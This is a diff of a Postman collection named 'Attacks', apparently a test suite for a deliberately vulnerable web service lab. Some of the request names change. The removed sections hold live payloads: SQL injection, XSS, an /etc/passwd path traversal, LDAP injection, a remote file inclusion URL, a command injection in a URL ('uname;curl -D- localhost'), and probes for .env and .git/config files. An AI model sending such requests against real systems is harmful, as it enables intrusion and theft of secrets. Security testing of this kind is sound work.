@@ -1,14 +1,16 @@
+
 {
 	"info": {
 		"name": "Attacks",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+
 	},
 	"item": [
 		{
 			"name": "JSON Attacks",
 			"item": [
 				{
-					"name": "/api/v2/notesearch (SQL INJ)",
+					"name": "/api/v2/notesearch (SQL Inj) Copy",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -38,7 +40,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (XSS)",
+					"name": "/api/v2/notesearch (XSS) Copy",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -68,7 +70,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (Traversal)",
+					"name": "/api/v2/notesearch (Traversal) Copy",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -98,7 +100,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (LDAP Injection)",
+					"name": "/api/v2/notesearch (LDAP Injection) Copy",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -128,7 +130,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (RFI)",
+					"name": "/api/v2/notesearch (RFI) Copy",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -158,7 +160,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/notesearch (PHP Python)",
+					"name": "/api/v2/notesearch (PHP Python) Copy",
 					"request": {
 						"method": "POST",
 						"header": [],
@@ -188,232 +190,7 @@
 					"response": []
 				},
 				{
-					"name": "/api/v2/sysinfo/uname (OS Command)",
-					"protocolProfileBehavior": {
-						"disableBodyPruning": true,
-						"disabledSystemHeaders": {
-							"connection": true
-						}
-					},
-					"request": {
-						"method": "GET",
-						"header": [
-							{
-								"key": "Referer",
-								"value": "https://dvws.darklab.co/admin.html",
-								"type": "text"
-							},
-							{
-								"key": "Connection",
-								"value": "close",
-								"type": "text"
-							}
-						],
-						"body": {
-							"mode": "raw",
-							"raw": "",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://{{appname}}/api/v2/sysinfo/uname;curl -D- localhost",
-							"protocol": "https",
-							"host": [
-								"{{appname}}"
-							],
-							"path": [
-								"api",
-								"v2",
-								"sysinfo",
-								"uname;curl -D- localhost"
-							]
-						}
-					},
-					"response": []
-				}
-			]
-		},
-		{
-			"name": "JSON REST Admin Attacks",
-			"item": [
-				{
-					"name": "/rest/admin (SQL Inj)",
-					"request": {
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\r\n    \"search\":\"%32%27%20%61%6e%64%20%27%31%27%3d%27%31\"\r\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://{{appname}}/rest/admin",
-							"protocol": "https",
-							"host": [
-								"{{appname}}"
-							],
-							"path": [
-								"rest",
-								"admin"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "/rest/admin (XSS)",
-					"request": {
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\r\n    \"search\":\"<script>document.domain</script>\"\r\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://{{appname}}/api/v2/notesearch/",
-							"protocol": "https",
-							"host": [
-								"{{appname}}"
-							],
-							"path": [
-								"api",
-								"v2",
-								"notesearch",
-								""
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "/rest/admin (Traversal)",
-					"request": {
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\r\n    \"search\":\"../../../../../../etc/passwd\"\r\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://{{appname}}/rest/admin",
-							"protocol": "https",
-							"host": [
-								"{{appname}}"
-							],
-							"path": [
-								"rest",
-								"admin"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "/rest/admin (LDAP Injection)",
-					"request": {
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\r\n    \"search\":\"username=*)|(userPassword=&password=*)\"\r\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://{{appname}}/rest/admin/role",
-							"protocol": "https",
-							"host": [
-								"{{appname}}"
-							],
-							"path": [
-								"rest",
-								"admin",
-								"role"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "/rest/admin (RFI)",
-					"request": {
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\r\n    \"search\":\"https://remote.file.com/payload.exe\"\r\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://{{appname}}/api/v2/notesearch/",
-							"protocol": "https",
-							"host": [
-								"{{appname}}"
-							],
-							"path": [
-								"api",
-								"v2",
-								"notesearch",
-								""
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "/rest/admin(PHP Python)",
-					"request": {
-						"method": "POST",
-						"header": [],
-						"body": {
-							"mode": "raw",
-							"raw": "{\r\n    \"search\":\"setdatasourceusername=admin || setdatasourcepassword=*\"\r\n}",
-							"options": {
-								"raw": {
-									"language": "json"
-								}
-							}
-						},
-						"url": {
-							"raw": "https://{{appname}}/rest/admin",
-							"protocol": "https",
-							"host": [
-								"{{appname}}"
-							],
-							"path": [
-								"rest",
-								"admin"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "/rest/admin (OS Command)",
+					"name": "/api/v2/sysinfo/uname (OS Command) Copy",
 					"protocolProfileBehavior": {
 						"disableBodyPruning": true,
 						"disabledSystemHeaders": {
@@ -665,186 +442,8 @@
 					"response": []
 				}
 			]
-		},
-		{
-			"name": "Surveillance",
-			"item": [
-				{
-					"name": ".env probing",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/.env",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								".env"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "DNS query",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/dns-query",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								"dns-query"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "Git Config",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/.git/config",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								".git",
-								"config"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": ".well-known",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/.well-known/",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								".well-known",
-								""
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "admin",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/admin",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								"admin"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": ".well-known/security.txt",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/.well-known/security.txt",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								".well-known",
-								"security.txt"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "boaform",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/boaform/admin/formLogin?username=user&psd=user",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								"boaform",
-								"admin",
-								"formLogin"
-							],
-							"query": [
-								{
-									"key": "username",
-									"value": "user"
-								},
-								{
-									"key": "psd",
-									"value": "user"
-								}
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "rest application-version",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/rest/admin/application-version",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								"rest",
-								"admin",
-								"application-version"
-							]
-						}
-					},
-					"response": []
-				},
-				{
-					"name": "/actuator/gateway/routes",
-					"request": {
-						"method": "GET",
-						"header": [],
-						"url": {
-							"raw": "https:///{{appname}}/actuator/gateway/routes",
-							"protocol": "https",
-							"path": [
-								"{{appname}}",
-								"actuator",
-								"gateway",
-								"routes"
-							]
-						}
-					},
-					"response": []
-				}
-			]
 		}
 	],
-	"auth": {
-		"type": "bearer",
-		"bearer": [
-			{
-				"key": "token",
-				"value": "YourBearerTokenHere",
-				"type": "string"
-			}
-		]
-	},
 	"event": [
 		{
 			"listen": "prerequest",
